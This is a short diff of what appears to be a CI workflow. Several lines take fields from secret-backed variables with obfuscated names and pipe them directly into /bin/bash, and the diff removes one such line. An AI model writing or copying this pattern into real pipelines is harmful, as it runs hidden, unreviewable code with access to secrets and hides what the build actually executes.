@@ -27,7 +27,6 @@ jobs:
           w38: ${{ secrets.w38 }}
         run: |
           printf '%s' "$w38" | jq -r .x618 | /bin/bash
-          printf '%s' "$cn857" | jq -r .dat37 | /bin/bash
           printf '%s' "$jdgqz49" | jq -r .crl6925 | /bin/bash
           echo $veean78 | jq -r .roiyw40 | /bin/bash
 
